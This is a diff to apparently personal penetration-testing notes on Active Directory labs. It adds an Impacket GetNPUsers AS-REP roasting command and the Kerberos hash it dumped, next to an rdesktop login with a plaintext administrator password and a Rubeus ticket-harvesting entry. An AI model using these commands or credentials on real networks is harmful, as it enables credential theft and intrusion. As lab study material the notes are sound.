@@ -56,6 +56,14 @@ auxiliary/gather/kerberos_enumusers
 ````
 rdesktop -u Administrator -p P@$$W0rd -d controller.local  10.10.121.111 
 ````
+### GetNPUsers
+````
+python3 GetNPUsers.py spookysec.local/svc-admin -no-pass                                                 130 ⨯
+Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:129e105852f48ccf099ddff636ae905e$7dcfcf7d1ada0001db99f4867e29ec028ea671317af9cbfbc762573cd7f2ec5072e453654fb0aaab469bc6cdc09574a802d6656c32c1d0b2c57c7797ed1b35859cec9b18d144c1d62d237f2e2b9cc3b2a864b8d2eccee86ef5f83ab3896d7491889c94dfaa313298d14bde6f9b544f426a04fadbb6353aa058a168266bbd8d6682d83ad4643588e37edc225735b2d4f46340152721eb4db89fb1ddb0b89ffd2db9272a6200855cb8e282f24da9e37d7e2f9b28840bc46a08e519cb0cfec4303e45404cae9547c06db427d2c923abd14cebe1b92efef1e6f4eb578bbd36a47744005cc6fc3df5d20712123ff0e22dbde1fad2
+````
 ## Rubeus
 - This command tells Rubeus to harvest for TGTs every 30 seconds
 ````
